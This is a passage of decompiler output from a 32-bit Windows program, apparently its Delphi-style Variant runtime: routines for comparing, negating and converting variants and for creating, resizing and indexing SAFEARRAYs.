      v34 = sub_414A24(&v29, v36, v16);
    }
  }
  else if ( v4 >= 0x10Fu )
  {
    if ( !sub_415EA4(v4, &v30) )
      sub_412170(v7);
    v25 = &v33;
    if ( (*(unsigned __int8 (__fastcall **)(int, VARIANTARG *, unsigned __int16 *))(*(_DWORD *)v30 + 4))(11, v37, &v33) )
    {
      if ( v37->vt == v33 )
      {
        v25 = (unsigned __int16 *)v35;
        v10 = (*(int (__fastcall **)(VARIANTARG *, VARIANTARG *, unsigned int))(*(_DWORD *)v30 + 52))(v36, v37, v35);
        v34 = byte_42B498[2 * v35 - 28 + (v10 & 0x7F)];
      }
      else
      {
        sub_412B30(&v29, v37, v33);
        if ( (v29.vt & 0xFFF) != v33 )
          sub_412168(v8);
        v25 = (unsigned __int16 *)v35;
        v9 = (*(int (__fastcall **)(VARIANTARG *, VARIANTARG *, unsigned int))(*(_DWORD *)v30 + 52))(v36, &v29, v35);
        v34 = byte_42B498[2 * v35 - 28 + (v9 & 0x7F)];
      }
    }
    else
    {
      sub_412B30(&v29, v36, v3);
      if ( v3 != (v29.vt & 0xFFF) )
        sub_412168(v11);
      v34 = sub_414A24(v37, &v29, v11);
    }
  }
  else if ( v3 == 257 || v4 == 257 )
  {
    sub_412178(&v28);
    v25 = (unsigned __int16 *)&savedregs;
    v24[1] = (unsigned int)&loc_414644;
    v24[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v24);
    sub_4125AC(&v28, (int)v37);
    if ( v3 == 257 )
      dword_42CA48(v24[0]);
    if ( v4 == 257 )
    {
      sub_4125AC(&v29, (int)v36);
      dword_42CA48(v24[0]);
      v34 = sub_414554(v35, &v29);
    }
    else
    {
      v34 = sub_414554(v35, v36);
    }
    v6 = (int)v25;
    __writefsdword(0, v24[0]);
    v25 = (unsigned __int16 *)&loc_4148DE;
    sub_412180(&v28, v6);
  }
  else
  {
    v34 = sub_414A24(v37, v36, v5);
  }
  v22 = (int)v27;
  __writefsdword(0, v26[0]);
  v27 = (int *)&loc_4148FB;
  sub_412180(&v29, v22);
  return v34;
}
// 414651: variable 'v5' is possibly undefined
// 41466C: variable 'v7' is possibly undefined
// 4146BB: variable 'v8' is possibly undefined
// 414731: variable 'v11' is possibly undefined
// 414757: variable 'v12' is possibly undefined
// 41479C: variable 'v13' is possibly undefined
// 414819: variable 'v16' is possibly undefined
// 41483F: variable 'v17' is possibly undefined
// 414884: variable 'v19' is possibly undefined
// 4148D9: variable 'v18' is possibly undefined
// 42B498: using guessed type _BYTE byte_42B498[12];
// 42CA48: using guessed type int (__stdcall *dword_42CA48)(_DWORD);
// 414554: using guessed type unsigned __int16 var_10;
// 414554: using guessed type int var_18;

//----- (00414908) --------------------------------------------------------
char __usercall sub_414908@<al>(VARIANTARG *a1@<eax>, VARIANTARG *a2@<edx>, unsigned int a3@<ecx>)
{
  return sub_414554(a1, a2, a3);
}

//----- (00414910) --------------------------------------------------------
unsigned int __usercall sub_414910@<eax>(int a1@<eax>, void *a2@<ecx>)
{
  unsigned int v2; // ebx

  v2 = a1 & 0xFFFF0FFF;
  if ( (a1 & 0xFFFu) > 0x14 )
  {
    if ( (_WORD)v2 != 256 )
      sub_412170(a2);
    LOWORD(v2) = 8;
  }
  return v2;
}

//----- (00414934) --------------------------------------------------------
char __usercall sub_414934@<al>(int a1@<eax>, int a2@<edx>)
{
  if ( a2 > a1 )
    return 0;
  if ( a2 >= a1 )
    return 1;
  return 2;
}

//----- (00414948) --------------------------------------------------------
char __stdcall sub_414948(__int64 a1, __int64 a2)
{
  if ( a2 < a1 )
    return 0;
  if ( a2 <= a1 )
    return 1;
  return 2;
}

//----- (00414984) --------------------------------------------------------
char __stdcall sub_414984(double a1, double a2)
{
  if ( a2 < a1 )
    return 0;
  if ( a2 <= a1 )
    return 1;
  return 2;
}

//----- (004149AC) --------------------------------------------------------
int __usercall sub_4149AC@<eax>(VARIANTARG *a1@<eax>, VARIANTARG *a2@<edx>)
{
  char *v3; // eax
  int v4; // eax
  int v5; // eax
  int v6; // ebx
  char *v8; // [esp-14h] [ebp-1Ch]
  unsigned int v9[2]; // [esp-10h] [ebp-18h] BYREF
  int *v10; // [esp-8h] [ebp-10h]
  char *v11; // [esp+0h] [ebp-8h] BYREF
  char *v12; // [esp+4h] [ebp-4h] BYREF
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v12 = 0;
  v11 = 0;
  v10 = &savedregs;
  v9[1] = (unsigned int)&loc_414A13;
  v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  sub_4131C8((volatile __int32 *)&v12, a1);
  sub_4131C8((volatile __int32 *)&v11, a2);
  v8 = sub_40471C(v11);
  v3 = sub_40471C(v12);
  v4 = sub_408170(v3, v8);
  LOBYTE(v5) = sub_414934(v4, 0);
  v6 = v5;
  __writefsdword(0, v9[0]);
  v10 = (int *)&loc_414A1A;
  sub_404290((int)&v11, 2);
  return v6;
}
// 4149F6: variable 'v5' is possibly undefined

//----- (00414A24) --------------------------------------------------------
char __usercall sub_414A24@<al>(VARIANTARG *a1@<eax>, VARIANTARG *a2@<edx>, void *a3@<ecx>)
{
  VARIANTARG *v4; // esi
  int v5; // eax
  unsigned __int8 v6; // bl
  void *v7; // ecx
  unsigned __int8 v8; // al
  _BYTE *v9; // ebp
  int v10; // eax
  __int64 v11; // rax
  double v12; // st7
  double v13; // st7
  bool v14; // al
  __int64 v16; // [esp+8h] [ebp-1Ch]
  double v17; // [esp+8h] [ebp-1Ch]
  double v18; // [esp+8h] [ebp-1Ch]
  int v19; // [esp+Ch] [ebp-18h]
  int v20; // [esp+Ch] [ebp-18h]
  char v21; // [esp+10h] [ebp-14h]

  v4 = a1;
  v21 = 1;
  LOWORD(a1) = a1->vt;
  v5 = (unsigned __int16)sub_414910((int)a1, a3);
  v6 = byte_42B428[(unsigned __int16)v5];
  LOWORD(v5) = a2->vt;
  v8 = byte_42B428[(unsigned __int16)sub_414910(v5, v7)];
  v9 = &byte_42B440[9 * v6];
  switch ( v9[v8] )
  {
    case 0:
      sub_412170((void *)(unsigned __int8)v9[v8]);
    case 1:
      v21 = sub_414934(v6, v8 & 0x7F);
      break;
    case 2:
      v19 = sub_412CB4(a2);
      v10 = sub_412CB4(v4);
      v21 = sub_414934(v10, v19);
      break;
    case 3:
    case 7:
      v17 = sub_412F18(v4);
      v12 = sub_412F18(a2);
      v21 = sub_414984(v12, v17);
      break;
    case 4:
      v18 = sub_413054(v4) / 10000.0;
      v13 = sub_413054(a2);
      v21 = sub_414984(v13 / 10000.0, v18);
      break;
    case 5:
      v21 = sub_4149AC(v4, a2);
      break;
    case 6:
      v20 = sub_412EDC(a2) & 0x7F;
      v14 = sub_412EDC(v4);
      v21 = sub_414934(v14 & 0x7F, v20);
      break;
    case 8:
      v16 = sub_412D90(v4);
      v11 = sub_412D90(a2);
      v21 = sub_414948(v11, v16);
      break;
    default:
      return v21;
  }
  return v21;
}
// 414A45: variable 'v7' is possibly undefined
// 42B440: using guessed type _BYTE byte_42B440[84];

//----- (00414B88) --------------------------------------------------------
LONG __usercall sub_414B88@<eax>(VARIANTARG *a1@<eax>, void *a2@<ecx>)
{
  unsigned __int16 v3; // bx
  void *v5; // ecx
  void *v6; // [esp+0h] [ebp-Ch] BYREF

  v6 = a2;
  v3 = a1->vt & 0xFFF;
  if ( v3 < 0x10Fu )
    return sub_414BCC(a1, a2);
  if ( !sub_415EA4(v3, &v6) )
    sub_412170(v5);
  return (*(int (__fastcall **)(int, VARIANTARG *))(*(_DWORD *)v6 + 48))(12, a1);
}
// 414BC3: variable 'v5' is possibly undefined

//----- (00414BCC) --------------------------------------------------------
LONG __usercall sub_414BCC@<eax>(VARIANTARG *a1@<eax>, void *a2@<ecx>)
{
  unsigned __int16 v3; // bx
  LONG result; // eax
  int v5; // eax
  __int64 v6; // rax
  int v7; // ecx
  double v8; // st7

  v3 = a1->vt & 0xFFF;
  while ( 2 )
  {
    result = v3;
    if ( v3 <= 8u )
    {
      switch ( v3 )
      {
        case 0u:
        case 9u:
        case 0xAu:
        case 0xCu:
        case 0xDu:
        case 0xEu:
        case 0xFu:
          sub_412170(a2);
        case 1u:
          return result;
        case 2u:
        case 3u:
        case 0xBu:
        case 0x10u:
        case 0x11u:
          v5 = sub_412CB4(a1);
          return (LONG)sub_4134A4(a1, (VARIANTARG *)-v5, -4);
        case 4u:
        case 5u:
        case 8u:
          v8 = sub_412F18(a1);
          return sub_405124(-v8);
        case 6u:
          a1->llVal = (__int64)-(double)a1->llVal;
          return result;
        case 7u:
          a1->dblVal = -a1->dblVal;
          return result;
        case 0x12u:
        case 0x13u:
        case 0x14u:
          v6 = sub_412D90(a1);
          return sub_413554(a1, v7, -(int)v6, (unsigned __int64)-v6 >> 32);
        default:
          if ( v3 != 256 )
            sub_412170(a2);
          v3 = 8;
          continue;
      }
    }
    break;
  }
  return result;
}
// 414C62: variable 'v7' is possibly undefined
// 405124: using guessed type int __usercall sub_405124@<eax>(double@<st0>);

//----- (00414C98) --------------------------------------------------------
int __usercall sub_414C98@<eax>(_WORD *a1@<eax>, void *a2@<ecx>)
{
  unsigned __int16 v3; // bx
  int result; // eax
  void *v5; // ecx
  void *v6; // [esp+0h] [ebp-Ch] BYREF

  v6 = a2;
  v3 = *a1 & 0xFFF;
  if ( v3 >= 0x10Fu )
  {
    if ( !sub_415EA4(v3, &v6) )
      sub_412170(v5);
    return (*(int (__fastcall **)(int, _WORD *))(*(_DWORD *)v6 + 48))(13, a1);
  }
  else
  {
    LOWORD(result) = sub_414CDC((int)a1, a2);
  }
  return result;
}
// 414CD3: variable 'v5' is possibly undefined

//----- (00414CDC) --------------------------------------------------------
__int16 __usercall sub_414CDC@<ax>(int a1@<eax>, void *a2@<ecx>)
{
  VARIANTARG *v2; // ebx
  __int64 v3; // rax
  int v4; // ecx
  int v5; // eax
  int v7; // [esp+0h] [ebp-4h]

  v2 = (VARIANTARG *)a1;
  LOWORD(a1) = *(_WORD *)a1 & 0xFFF;
  if ( !(_WORD)a1 )
    sub_412170(a2);
  if ( (_WORD)a1 != 1 )
  {
    switch ( (_WORD)a1 )
    {
      case 0xB:
        a1 = -(v2->iVal == 0);
        v2->iVal = a1;
        break;
      case 0x101:
        dword_42CA48(v7);
        LOWORD(a1) = sub_414C98();
        break;
      case 0x14:
        v3 = sub_412D90(v2);
        LOWORD(a1) = sub_413554(v2, v4, ~(_DWORD)v3, ~HIDWORD(v3));
        break;
      default:
        if ( (_WORD)a1 != 256 && (unsigned __int16)a1 > 0x14u )
          sub_412170(a2);
        v5 = sub_412CB4(v2);
        LOWORD(a1) = (unsigned __int16)sub_4134A4(v2, (VARIANTARG *)~v5, -4);
        break;
    }
  }
  return a1;
}
// 414D22: variable 'v7' is possibly undefined
// 414D46: variable 'v4' is possibly undefined
// 414C98: using guessed type int sub_414C98(void);
// 42CA48: using guessed type int (__stdcall *dword_42CA48)(_DWORD);

//----- (00414D84) --------------------------------------------------------
VARIANTARG *__usercall sub_414D84@<eax>(VARIANTARG *result@<eax>)
{
  _DWORD v1[4]; // [esp-10h] [ebp-10h] BYREF

  if ( result->vt >= 8u )
  {
    v1[3] = result->cyVal.Hi;
    v1[2] = result->lVal;
    v1[1] = result->decVal.Hi32;
    v1[0] = *(_DWORD *)&result->vt;
    result->vt = 0;
    return sub_4125AC(result, (int)v1);
  }
  return result;
}

//----- (00414DA8) --------------------------------------------------------
__int16 __usercall sub_414DA8@<ax>(int a1@<eax>)
{
  return *(_WORD *)a1;
}

//----- (00414DAC) --------------------------------------------------------
int __usercall sub_414DAC@<eax>(__int16 *a1@<eax>, int a2@<ecx>)
{
  int v3; // ebx
  unsigned __int16 v4; // si
  __int16 v5; // ax
  void *v6; // ecx
  int v8[4]; // [esp+0h] [ebp-10h] BYREF

  v8[0] = a2;
  v3 = 0;
  v4 = *a1 & 0xFFF;
  if ( v4 >= 0x10Fu )
  {
    if ( !sub_415EA4(v4, v8) )
      sub_412170(v6);
    return (*(int (**)(void))(*(_DWORD *)v8[0] + 20))();
  }
  else if ( !*a1 || ((v5 = *a1, *a1 == 9) || v5 == 13) && !*((_DWORD *)a1 + 2) )
  {
    LOBYTE(v3) = 1;
  }
  else
  {
    return 0;
  }
  return v3;
}
// 414E01: variable 'v6' is possibly undefined
// 414DAC: using guessed type int var_10[4];

//----- (00414E10) --------------------------------------------------------
int __usercall sub_414E10@<eax>(__int16 a1@<ax>, int a2@<ecx>)
{
  int result; // eax
  int v3; // [esp-4h] [ebp-Ch] BYREF

  v3 = a2;
  if ( (a1 & 0xFFFu) < 0x10F || !sub_415EA4(a1 & 0xFFF, &v3) )
    return 0;
  LOBYTE(result) = 1;
  return result;
}

//----- (00414E3C) --------------------------------------------------------
bool __usercall sub_414E3C@<al>(__int16 *a1@<eax>, _WORD *a2@<edx>)
{
  __int16 v2; // ax
  char v4; // zf

  v2 = *a1;
  if ( !v2 )
    return *a2 == 0;
  if ( v2 == 1 )
    return *a2 == 1;
  if ( *a2 < 2u )
    return 0;
  sub_405154();
  return v4;
}
// 414E79: variable 'v4' is possibly undefined

//----- (00414E80) --------------------------------------------------------
int __usercall sub_414E80@<eax>(int result@<eax>)
{
  *(_WORD *)result = 10;
  *(_DWORD *)(result + 8) = -2147352572;
  return result;
}

//----- (00414E90) --------------------------------------------------------
int __usercall sub_414E90@<eax>(int a1@<eax>, _WORD *a2@<edx>, signed int a3@<ecx>)
{
  int v4; // eax
  int v5; // ecx
  void *v6; // ecx
  unsigned int v8[2]; // [esp-Ch] [ebp-1Ch] BYREF
  int *v9; // [esp-4h] [ebp-14h]
  char *v10; // [esp+8h] [ebp-8h] BYREF
  signed int v11; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v10 = 0;
  v11 = a3;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_414EF9;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  if ( *a2 >= 2u )
    sub_4050E0(a3, a2);
  v4 = sub_4048B0(a1, v10, v11);
  sub_402D74(v4, v5);
  sub_4027F4(v6);
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_414F00;
  sub_40426C(&v10);
  return a1;
}
// 414ED7: variable 'v5' is possibly undefined
// 414EDC: variable 'v6' is possibly undefined
// 4050E0: using guessed type int __fastcall sub_4050E0(_DWORD, _DWORD);

//----- (00414F08) --------------------------------------------------------
int __usercall sub_414F08@<eax>(int a1@<eax>, _WORD *a2@<edx>)
{
  return sub_414E90(a1, a2, 0);
}

//----- (00414F10) --------------------------------------------------------
int __usercall sub_414F10@<eax>(int a1@<eax>, int a2@<edx>, _DWORD *a3@<ecx>, int a4@<ebx>)
{
  int v4; // eax

  LOWORD(a4) = *(_WORD *)a1;
  *(_WORD *)a2 = *(_WORD *)a1;
  if ( *(_WORD *)a2 == 16396 )
  {
    a4 = *(_DWORD *)(a1 + 8);
    if ( (*(_BYTE *)(a4 + 1) & 0x20) != 0 )
    {
      a1 = *(_DWORD *)(a1 + 8);
      LOWORD(a4) = *(_WORD *)a1;
      *(_WORD *)a2 = *(_WORD *)a1;
    }
  }
  LOBYTE(a4) = (*(_BYTE *)(a2 + 1) & 0x20) != 0;
  if ( (*(_BYTE *)(a2 + 1) & 0x20) != 0 )
  {
    if ( (*(_BYTE *)(a2 + 1) & 0x40) != 0 )
      v4 = **(_DWORD **)(a1 + 8);
    else
      v4 = *(_DWORD *)(a1 + 8);
    *a3 = v4;
  }
  else
  {
    *a3 = 0;
  }
  return a4;
}

//----- (00414F5C) --------------------------------------------------------
VARIANTARG *__userpurge sub_414F5C@<eax>(LONG *a1@<eax>, int a2@<edx>, void *a3@<ecx>, VARIANTARG *a4)
{
  UINT v6; // ebx
  SAFEARRAYBOUND *p_rgsabound; // edx
  LONG *v8; // eax
  void *v9; // ecx
  SAFEARRAY *v10; // ebx
  VARIANTARG *result; // eax
  SAFEARRAYBOUND rgsabound; // [esp+8h] [ebp-208h] BYREF
  UINT cDims; // [esp+208h] [ebp-8h]
  __int16 v14; // [esp+20Eh] [ebp-2h]

  v14 = (__int16)a3;
  if ( (a2 & 1) == 0 || a2 > 127 || !sub_41512C(v14) )
    sub_4027E8(18, a3);
  cDims = (a2 + 1) / 2;
  if ( (int)(cDims - 1) >= 0 )
  {
    v6 = cDims;
    p_rgsabound = &rgsabound;
    v8 = a1;
    do
    {
      p_rgsabound->lLbound = *v8;
      p_rgsabound->cElements = v8[1] - p_rgsabound->lLbound + 1;
      v8 += 2;
      ++p_rgsabound;
      --v6;
    }
    while ( v6 );
  }
  v10 = SafeArrayCreate(v14, cDims, &rgsabound);
  if ( !v10 )
    sub_4027E8(18, v9);
  sub_412180(a4, (int)v9);
  a4->vt = v14 | 0x2000;
  result = a4;
  a4->lVal = (LONG)v10;
  return result;
}
// 414F88: variable 'a3' is possibly undefined
// 414FDF: variable 'v9' is possibly undefined

//----- (00415008) --------------------------------------------------------
HRESULT __usercall sub_415008@<eax>(int a1@<eax>, int a2@<edx>)
{
  void *v3; // ecx
  HRESULT result; // eax
  void *v5; // ecx
  SAFEARRAYBOUND v6; // [esp+0h] [ebp-18h] BYREF
  char v7[4]; // [esp+8h] [ebp-10h] BYREF
  SAFEARRAY *psa; // [esp+Ch] [ebp-Ch] BYREF

  if ( !(unsigned __int8)sub_414F10(a1, (int)v7, &psa, a1) )
    sub_4027E8(19, v3);
  v6.lLbound = *((_DWORD *)&psa->pvData + 2 * psa->cDims);
  v6.cElements = a2 - v6.lLbound + 1;
  result = SafeArrayRedim(psa, &v6);
  if ( result )
    sub_4027E8(18, v5);
  return result;
}
// 415026: variable 'v3' is possibly undefined
// 415051: variable 'v5' is possibly undefined
// 415008: using guessed type char var_10[4];

//----- (0041505C) --------------------------------------------------------
__int64 __usercall sub_41505C@<edx:eax>(int a1@<eax>)
{
  void *v1; // ecx
  __int64 v3; // [esp+0h] [ebp-Ch] BYREF

  if ( !(unsigned __int8)sub_414F10(a1, (int)&v3 + 4, &v3, a1) )
    sub_4027E8(19, v1);
  return v3;
}
// 415075: variable 'v1' is possibly undefined

//----- (00415084) --------------------------------------------------------
int __usercall sub_415084@<eax>(int a1@<eax>)
{
  int v2; // [esp+0h] [ebp-Ch] BYREF
  unsigned __int16 *v3; // [esp+4h] [ebp-8h] BYREF

  if ( (unsigned __int8)sub_414F10(a1, (int)&v2, &v3, a1) )
    return *v3;
  else
    return 0;
}

//----- (004150AC) --------------------------------------------------------
LONG __usercall sub_4150AC@<eax>(int a1@<eax>, UINT a2@<edx>, LONG a3@<ecx>)
{
  SAFEARRAY *v3; // eax
  void *v4; // ecx
  LONG v7[3]; // [esp+0h] [ebp-Ch] BYREF

  v7[0] = a3;
  v3 = (SAFEARRAY *)sub_41505C(a1);
  if ( SafeArrayGetLBound(v3, a2, v7) )
    sub_4027E8(20, v4);
  return v7[0];
}
// 4150C8: variable 'v4' is possibly undefined
// 4150AC: using guessed type LONG var_C[3];

//----- (004150D4) --------------------------------------------------------
LONG __usercall sub_4150D4@<eax>(int a1@<eax>, UINT a2@<edx>, LONG a3@<ecx>)
{
  SAFEARRAY *v3; // eax
  void *v4; // ecx
  LONG v7[3]; // [esp+0h] [ebp-Ch] BYREF

  v7[0] = a3;
  v3 = (SAFEARRAY *)sub_41505C(a1);
  if ( SafeArrayGetUBound(v3, a2, v7) )
    sub_4027E8(20, v4);
  return v7[0];
}
// 4150F0: variable 'v4' is possibly undefined
// 4150D4: using guessed type LONG var_C[3];

//----- (004150FC) --------------------------------------------------------
char __usercall sub_4150FC@<al>(_WORD *a1@<eax>, int a2@<ebx>)
{
  return sub_415104(a1, 0, a2);
}

//----- (00415104) --------------------------------------------------------
char __usercall sub_415104@<al>(_WORD *a1@<eax>, char a2@<dl>, int a3@<ebx>)
{
  int v4; // [esp+0h] [ebp-8h] BYREF
  int v5; // [esp+4h] [ebp-4h] BYREF

  if ( a2 )
    return sub_414F10((int)a1, (int)&v4, &v5, a3);
  else
    return (*a1 & 0x2000) == 0x2000;
}

//----- (0041512C) --------------------------------------------------------
bool __usercall sub_41512C@<al>(__int16 a1@<ax>)
{
  unsigned __int16 v1; // ax

  v1 = a1 & 0xFFF;
  return v1 < 0x16u && *((_BYTE *)off_42B9CC + 12 * v1);
}
// 42B9CC: using guessed type void *off_42B9CC;

//----- (00415150) --------------------------------------------------------
bool __usercall sub_415150@<al>(__int16 a1@<ax>, int a2@<ecx>)
{
  unsigned __int16 v2; // bx

  v2 = a1 & 0xFFF;
  return (a1 & 0xFFFu) < 0x16 && *((_BYTE *)off_42B9CC + 12 * v2 + 1) || (unsigned __int8)sub_414E10(v2, a2);
}
// 42B9CC: using guessed type void *off_42B9CC;

//----- (00415188) --------------------------------------------------------
VARIANTARG *__usercall sub_415188@<eax>(int a1@<ebx>, VARIANTARG *a2, int a3, int a4, LONG rgIndices)
{
  void *v5; // ecx
  int v6; // ebx
  void *v7; // ecx
  void *v8; // ecx
  int v9; // ecx
  unsigned int v11[2]; // [esp-Ch] [ebp-2Ch] BYREF
  int *v12; // [esp-4h] [ebp-24h]
  void *ppvData; // [esp+4h] [ebp-1Ch] BYREF
  SAFEARRAY *psa; // [esp+8h] [ebp-18h] BYREF
  __int16 v15; // [esp+Eh] [ebp-12h] BYREF
  VARIANTARG v16; // [esp+10h] [ebp-10h] BYREF
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  if ( !(unsigned __int8)sub_414F10(a3, (int)&v15, &psa, a1) )
    sub_4027E8(19, v5);
  if ( psa->cDims != a4 )
    sub_4027E8(20, v5);
  sub_412178(&v16);
  v12 = &savedregs;
  v11[1] = (unsigned int)&loc_41524D;
  v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v11);
  v6 = v15 & 0xFFF;
  if ( v6 == 12 )
  {
    if ( SafeArrayPtrOfIndex(psa, &rgIndices, &ppvData) )
      sub_4027E8(20, v7);
    sub_4125AC(&v16, (int)ppvData);
  }
  else
  {
    if ( SafeArrayGetElement(psa, &rgIndices, &v16.decVal.Lo32) )
      sub_4027E8(20, v8);
    v16.vt = v6;
  }
  sub_4125AC(a2, (int)&v16);
  v9 = (int)v12;
  __writefsdword(0, v11[0]);
  v12 = (int *)&loc_415254;
  return sub_412180(&v16, v9);
}
// 4151A3: variable 'v5' is possibly undefined
// 4151F8: variable 'v7' is possibly undefined
// 415223: variable 'v8' is possibly undefined

//----- (0041525C) --------------------------------------------------------
VARIANTARG *__userpurge sub_41525C@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, VARIANTARG *a4)
{
  int v4; // ebx
  LONG v6; // [esp-4h] [ebp-8h]

  v4 = a3 + 1;
  if ( !((a3 + 1 < 0) ^ __OFADD__(1, a3) | (a3 == -1)) )
  {
    do
      v6 = *(_DWORD *)(a2 + 4 * a3--);
    while ( a3 >= 0 );
  }
  return sub_415188(v4, a4, a1, v4, v6);
}
// 415271: variable 'v6' is possibly undefined

//----- (00415280) --------------------------------------------------------
VARIANTARG *__usercall sub_415280@<eax>(int a1@<ebx>, int a2, VARIANTARG *a3, int a4, LONG rgIndices)
{
  void *v5; // ecx
  void *v6; // ecx
  int v7; // ebx
  void *v8; // ecx
  unsigned int v10; // ebx
  bool v11; // cf
  unsigned int v12; // ebx
  void *v13; // ecx
  int v14; // ecx
  unsigned int v15[2]; // [esp-Ch] [ebp-38h] BYREF
  int *v16; // [esp-4h] [ebp-30h]
  void *ppvData; // [esp+8h] [ebp-24h] BYREF
  int v18; // [esp+Ch] [ebp-20h] BYREF
  __int16 v19; // [esp+12h] [ebp-1Ah] BYREF
  SAFEARRAY *psa; // [esp+14h] [ebp-18h] BYREF
  __int16 v21; // [esp+1Ah] [ebp-12h] BYREF
  VARIANTARG v22; // [esp+1Ch] [ebp-10h] BYREF
  int savedregs; // [esp+2Ch] [ebp+0h] BYREF

  if ( !(unsigned __int8)sub_414F10(a2, (int)&v21, &psa, a1) )
    sub_4027E8(19, v5);
  if ( !(unsigned __int8)sub_414F10((int)a3, (int)&v19, &v18, a1) && !sub_415150(v19, (int)v6) && v19 != 256 )
    sub_4027E8(15, v6);
  if ( psa->cDims != a4 )
    sub_4027E8(20, v6);
  v7 = v21 & 0xFFF;
  if ( v7 == 12 && (v19 != 256 || (unsigned __int8)sub_414E10(256, (int)v6)) )
  {
    if ( SafeArrayPtrOfIndex(psa, &rgIndices, &ppvData) )
      sub_4027E8(20, v8);
    return (VARIANTARG *)sub_4050B0(v8, a3);
  }
  else
  {
    sub_412178(&v22);
    v16 = &savedregs;
    v15[1] = (unsigned int)&loc_4153BA;
    v15[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v15);
    if ( v7 == 12 )
    {
      sub_412B28(&v22, (int)a3);
      ppvData = &v22;
    }
    else
    {
      sub_412B30(&v22, a3, v7);
      v10 = v7 - 8;
      v11 = v10 < 2;
      v12 = v10 - 2;
      if ( v11 || v12 == 3 )
        ppvData = v22.bstrVal;
      else
        ppvData = &v22.decVal.Lo32;
    }
    if ( SafeArrayPutElement(psa, &rgIndices, ppvData) )
      sub_4027E8(20, v13);
    v14 = (int)v16;
    __writefsdword(0, v15[0]);
    v16 = (int *)&loc_4153C1;
    return sub_412180(&v22, v14);
  }
}
// 41529F: variable 'v5' is possibly undefined
// 4152B9: variable 'v6' is possibly undefined
// 415320: variable 'v8' is possibly undefined
// 41539F: variable 'v13' is possibly undefined
// 4050B0: using guessed type int __fastcall sub_4050B0(_DWORD, _DWORD);
// 415280: using guessed type int var_20;

//----- (004153C8) --------------------------------------------------------
VARIANTARG *__userpurge sub_4153C8@<eax>(int a1@<eax>, VARIANTARG *a2@<edx>, int a3@<ecx>, int a4)
{
  int i; // ebx
  LONG v6; // [esp-4h] [ebp-8h]

  for ( i = a4; i >= 0; --i )
    v6 = *(_DWORD *)(a3 + 4 * i);
  return sub_415280(a4 + 1, a1, a2, a4 + 1, v6);
}
// 4153E0: variable 'v6' is possibly undefined

//----- (004153F0) --------------------------------------------------------
_DWORD *__userpurge sub_4153F0@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>, int **a4)
{
  int v6; // ebx
  int v7; // edi
  int v8; // eax

  v6 = 0;
  if ( a3 >= 0 )
    goto LABEL_3;
  do
  {
    a1 = (_DWORD *)*a1;
LABEL_3:
    v7 = (int)a4 + *((unsigned __int8 *)a4 + 1);
    v8 = *(_DWORD *)(v7 + 2) * *(_DWORD *)(a2 + 4 * v6);
    a4 = *(int ***)(v7 + 6);
    if ( a4 )
      a4 = (int **)*a4;
    a1 = (_DWORD *)((char *)a1 + v8);
    ++v6;
  }
  while ( v6 <= a3 );
  return a1;
}

//----- (00415430) --------------------------------------------------------
int __usercall sub_415430@<eax>(int a1@<eax>)
{
  int v1; // edx
  int v2; // ecx

  v1 = 0;
  if ( a1 )
  {
    v2 = *(_DWORD *)(*(unsigned __int8 *)(a1 + 1) + a1 + 6);
    if ( v2 )
      return *(_DWORD *)v2;
  }
  return v1;
}

//----- (0041544C) --------------------------------------------------------
int __usercall sub_41544C@<eax>(_BYTE *a1@<eax>)
{
  int v1; // ebx

  v1 = 0;
  while ( a1 && *a1 == 17 )
  {
    ++v1;
    a1 = (_BYTE *)sub_415430((int)a1);
  }
  return v1;
}

//----- (00415464) --------------------------------------------------------
int __usercall sub_415464@<eax>(int result@<eax>)
{
  if ( result )
    return *(_DWORD *)(result - 4);
  return result;
}

//----- (0041546C) --------------------------------------------------------
int __usercall sub_41546C@<eax>(int *a1@<eax>, _BYTE *a2@<edx>)
{
  int result; // eax
  int v4; // esi
  int v5; // ebp
  int v6; // esi
  int v7; // edi
  char v8; // [esp+0h] [ebp-18h]
  int v9; // [esp+4h] [ebp-14h]

  v8 = 1;
  result = sub_41544C(a2) - 1;
  if ( result <= 0 )
    goto LABEL_11;
  v9 = result;
  while ( !a1 )
  {
LABEL_10:
    if ( !--v9 )
      goto LABEL_11;
  }
  v4 = sub_415464((int)a1);
  result = sub_415464(*a1);
  v5 = result;
  v6 = v4 - 1;
  if ( v6 <= 0 )
  {
LABEL_9:
    a1 = (int *)*a1;
    goto LABEL_10;
  }
  v7 = 1;
  while ( 1 )
  {
    result = sub_415464(a1[v7]);
    if ( v5 != result )
      break;
    ++v7;
    if ( !--v6 )
      goto LABEL_9;
  }
  v8 = 0;
LABEL_11:
  LOBYTE(result) = v8;
  return result;
}

//----- (004154D4) --------------------------------------------------------
int *__usercall sub_4154D4@<eax>(_DWORD *a1@<eax>, _BYTE *a2@<edx>, int *a3@<ecx>)
{
  int v5; // esi
  int *result; // eax
  int v7; // esi
  int v8; // esi
  int v9; // edi

  v5 = sub_41544C(a2);
  result = sub_405748(a3, (int)dword_4011C8, (void *)1, v5);
  v7 = v5 - 1;
  if ( v7 >= 0 )
  {
    v8 = v7 + 1;
    v9 = 0;
    do
    {
      if ( a1 )
      {
        result = (int *)(sub_415464((int)a1) - 1);
        *(_DWORD *)(*a3 + 4 * v9) = result;
        a1 = (_DWORD *)*a1;
      }
      ++v9;
      --v8;
    }
    while ( v8 );
  }
  return result;
}
// 4011C8: using guessed type int dword_4011C8[5];

//----- (00415528) --------------------------------------------------------
int __usercall sub_415528@<eax>(int *a1@<eax>, int a2@<edx>)
{
  int v4; // ebx
  int v5; // eax
  int v6; // edx
  int v7; // eax
  int v8; // eax

  v4 = 0;
  v5 = sub_405594(*a1);
  if ( v5 >= 0 )
  {
    v6 = v5 + 1;
    v7 = 0;
    while ( !*(_DWORD *)(*a1 + 4 * v7) )
    {
